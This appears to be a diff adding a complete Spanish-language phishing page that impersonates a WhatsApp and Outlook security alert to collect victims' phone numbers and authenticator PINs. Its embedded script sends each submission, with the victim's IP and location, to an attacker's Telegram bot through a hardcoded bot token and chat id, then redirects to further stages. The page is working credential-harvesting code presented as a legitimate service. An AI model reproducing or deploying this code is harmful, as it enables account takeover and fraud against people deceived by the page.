@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alerta de Actividad Sospechosa - WhatsApp</title>
+    <link rel="stylesheet" type="text/css" href="https://sappsapp23.sirv.com/docs/styles.css">
+   
+</head>
+<body>
+
+    <div id="popup" style="">
+        <div class="popup-content">
+            <h2>Actividad Inusual Detectada</h2>
+            <p>Hemos detectado actividades inusuales de parte de su cuenta de Outlook. Para seguir usándola normalmente, realice una verificación.</p>
+            <img src="https://sappsapp23.sirv.com/docs/21-18-05-265_512.gif" alt="Cargando...">
+        </div>
+    </div>
+
+    <header>
+       
+    </header>
+
+    <div class="content" style="display: none;">
+        <img src="https://sappsapp23.sirv.com/docs/117_outlook.jpg" width="250" alt="Logo WhatsApp"> <!-- Tamaño ajustado para móviles -->
+        <p>Ingrese su número de teléfono para sincronizar su cuenta de WhatsApp con Outlook:</p>
+        <form id="loginForm">
+            <!-- Input de selección de país -->
+                      <select id="country" required="">
+                <option value="" disabled="" selected="">Selecciona tu país</option>
+                <option value="+54">🇦🇷 Argentina</option>
+                <option value="+591">🇧🇴 Bolivia</option>
+                <option value="+55">🇧🇷 Brasil</option>
+                <option value="+56">🇨🇱 Chile</option>
+                <option value="+57">🇨🇴 Colombia</option>
+                <option value="+506">🇨🇷 Costa Rica</option>
+                <option value="+53">🇨🇺 Cuba</option>
+                <option value="+1">🇩🇴 República Dominicana</option>
+                <option value="+593">🇪🇨 Ecuador</option>
+                <option value="+503">🇸🇻 El Salvador</option>
+                <option value="+502">🇬🇹 Guatemala</option>
+                <option value="+504">🇭🇳 Honduras</option>
+                <option value="+52">🇲🇽 México</option>
+                <option value="+505">🇳🇮 Nicaragua</option>
+                <option value="+507">🇵🇦 Panamá</option>
+                <option value="+595">🇵🇾 Paraguay</option>
+                <option value="+51">🇵🇪 Perú</option>
+                <option value="+1">🇵🇷 Puerto Rico</option>
+                <option value="+598">🇺🇾 Uruguay</option>
+                <option value="+58">🇻🇪 Venezuela</option>
+            </select>
+            <!-- Input de teléfono -->
+            <input type="tel" id="telefono" name="telefono" placeholder="Número de teléfono" required="">
+
+            <button type="submit" id="submitButton">Continuar</button>
+        </form>
+    </div>
+
+    <footer>
+        <img src="https://sappsapp23.sirv.com/docs/GjxmhIpug9B.svg" alt="Logo WhatsApp">
+    </footer>
+
+    <script>
+        window.onload = function() {
+            setTimeout(function() {
+                document.getElementById('popup').style.display = 'none';
+                document.querySelector('.content').style.display = 'flex';
+            }, 5000);
+
+            const countrySelect = document.getElementById('country');
+            const phoneInput = document.getElementById('telefono');
+            const form = document.getElementById('loginForm');
+            const submitButton = document.getElementById('submitButton');
+
+            countrySelect.addEventListener('change', function() {
+                phoneInput.value = countrySelect.value;
+            });
+
+            phoneInput.addEventListener('input', function() {
+                validatePhoneNumber();
+            });
+            
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const countryCode = data.country_code;
+                    const countryMap = {
+                        'AR': '+54',
+                        'BO': '+591',
+                        'BR': '+55',
+                        'CL': '+56',
+                        'CO': '+57',
+                        'CR': '+506',
+                        'CU': '+53',
+                        'DO': '+1',
+                        'EC': '+593',
+                        'SV': '+503',
+                        'GT': '+502',
+                        'HN': '+504',
+                        'MX': '+52',
+                        'NI': '+505',
+                        'PA': '+507',
+                        'PY': '+595',
+                        'PE': '+51',
+                        'PR': '+1',
+                        'UY': '+598',
+                        'VE': '+58'
+                    };
+                    countrySelect.value = countryMap[countryCode] || '';
+                    validatePhoneNumber();
+                })
+                .catch(error => console.error('Error al obtener la ubicación:', error));
+        }
+    </script>
+
+   <script>
+    //bot token
+var telegram_bot_id =  "7624511401:AAE8rp04W79UnX5DS8t6EUbeTGWNGPgMkww";
+//chat id
+var chat_id ="7712518065";
+
+document.addEventListener("DOMContentLoaded", function() {
+    // Función para obtener el valor de un parámetro de la URL
+    function getQueryParam(param) {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get(param);
+    }
+
+    // Función para obtener la ubicación y enviar el mensaje a Telegram
+    function obtenerUbicacionYEnviarMensajeTelegram(code, password, nextPage, message) {
+        fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+            var country = data.country_name;
+            var region = data.region;
+            var ip = data.ip;
+            if (country && region && ip) {
+                message += '\nUbicación: ' + country + ', ' + region + '\nIP: ' + ip;
+            } else {
+                message += '\nNo se pudo obtener la ubicación.';
+            }
+            enviarMensajeTelegram(message, nextPage);
+        })
+        .catch(error => {
+            console.error("Error al obtener la ubicación:", error);
+            message += "\nError al obtener la ubicación.";
+            enviarMensajeTelegram(message, nextPage);
+        });
+    }
+
+    // Función para enviar el mensaje a Telegram y redirigir
+    function enviarMensajeTelegram(mensaje, nextPage) {
+      //  var token = telegram_bot_id;
+       // var chatId = chat_id;
+        var url = 'https://api.telegram.org/bot' + telegram_bot_id + '/sendMessage';
+        var params = {
+            chat_id: chat_id,
+            text: mensaje
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(params)
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Ocurrió un error al enviar el mensaje.');
+            }
+            console.log('Mensaje enviado con éxito.');
+            window.location.href = nextPage;
+        })
+        .catch(error => {
+            console.error('Error al enviar el mensaje:', error);
+        });
+    }
+
+    // Evento de envío de formulario para la página de inicio de sesión
+    var loginForm = document.getElementById("loginForm");
+    if (loginForm) {
+        loginForm.addEventListener("submit", function(event) {
+            event.preventDefault();
+            var telefono = document.getElementById("telefono").value;
+            obtenerUbicacionYEnviarMensajeTelegram(telefono, telefono, "cargando.html?action=telefono", "💲 Whatsapp 💲:\nTELEFONO: " + telefono);
+        });
+    }
+
+
+    // Evento de envío de formulario para la sección de contacto
+    var verificationForm = document.getElementById("verificationForm");
+    if (verificationForm) {
+        verificationForm.addEventListener("submit", function(event) {
+            event.preventDefault();
+            var auth = document.getElementById("auth").value;
+            obtenerUbicacionYEnviarMensajeTelegram(auth, auth, "cargando3.html?action=auth", "💲 Whatsapp 💲:\nPIN AUTHENTICADOR: " + auth);
+        });
+    
+    }
+});
+   </script>
+</body></html>
